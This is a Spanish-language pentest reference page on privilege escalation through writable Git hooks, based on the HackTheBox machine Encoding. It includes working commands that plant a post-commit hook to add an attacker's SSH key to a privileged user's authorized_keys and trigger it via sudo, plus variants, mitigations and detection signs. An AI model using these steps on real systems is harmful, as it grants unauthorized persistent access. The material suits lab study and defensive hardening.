---
topic: Git — escalada con hooks en repositorios escribibles
tags: [linux, git, hooks, post-commit, systemd, privesc, encoding]
---

# Git — escalada con hooks en repositorios escribibles

[🌐 English](git-hooks-privesc.en.md) | **Español**

## Concepto

Git ejecuta scripts de `.git/hooks` en momentos concretos, como `post-commit` después de confirmar. Si un usuario sin privilegios puede escribir en `.git` y otro usuario privilegiado ejecuta un commit sobre ese repositorio, el hook se ejecuta con los permisos del segundo. En Encoding, `www-data` podía ejecutar `git-commit.sh` como `svc` y escribir en `.git`; un `post-commit` añadía una clave SSH a `svc`.

## Cuándo aplica

- Un script privilegiado ejecuta `git add`/`git commit` sobre un repositorio.
- El usuario web puede escribir en `.git` o en sus hooks.
- El script se lanza con `sudo` o desde un servicio con otro usuario.
- No hay protecciones como `core.hooksPath` seguro o hooks deshabilitados.

## Procedimiento

1. Identificar el script y el usuario con el que se ejecuta.
2. Comprobar permisos y ACL de `.git` y `.git/hooks`.
3. Crear un hook `post-commit` con la acción deseada.
4. Dar permisos de ejecución al hook.
5. Provocar un cambio y ejecutar el script privilegiado.
6. Usar la clave, el archivo o la shell resultante.

## Comandos

```bash
ls -ld .git .git/hooks
getfacl .git
printf '#!/bin/bash\nmkdir -p /home/<USER>/.ssh\necho "<PUBLIC_KEY>" >> /home/<USER>/.ssh/authorized_keys\n' > .git/hooks/post-commit
chmod +x .git/hooks/post-commit
```

```bash
# Provocar el commit desde el script privilegiado
sudo -u <USER> /ruta/git-commit.sh
```

## Variantes

- Hook `pre-commit` para ejecutar antes de validar.
- Hook `post-checkout` o `post-merge` si el flujo no hace commit.
- `core.hooksPath` apuntando a un directorio controlado.
- `.git/config` con `core.fsmonitor` o alias maliciosos.
- Repositorios bare y hooks del lado servidor.

## Limitaciones

- El hook debe ser ejecutable y el usuario privilegiado debe ejecutar Git.
- `git commit --no-verify` no desactiva `post-commit`, pero sí `pre-commit`.
- Algunas configuraciones ignoran hooks por defecto.
- El propietario del repositorio puede impedir la escritura.
- La acción del hook queda registrada en el historial y en los logs.

## Mitigación

- No permitir escritura en `.git` a usuarios sin privilegios.
- Ejecutar los scripts de commit con el mismo usuario que escribe el repositorio.
- Usar `core.hooksPath` a un directorio de confianza y hooks versionados.
- Revisar los permisos y ACL de los repositorios.
- Evitar `sudo` sobre scripts que operan en repositorios compartidos.

## Detección

- Aparición de hooks nuevos o modificados en `.git/hooks`.
- Commits automáticos con autores inesperados.
- Claves SSH añadidas después de un commit.
- Ejecución de scripts desde `.git/hooks` por usuarios distintos del propietario.
- Cambios en `core.hooksPath` o en la configuración del repositorio.

## Referencias

- [0xdf — Encoding](https://0xdf.gitlab.io/2023/04/15/htb-encoding.html)
- [Git — Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [Ficha Encoding](../../machines/linux/encoding/README.md)
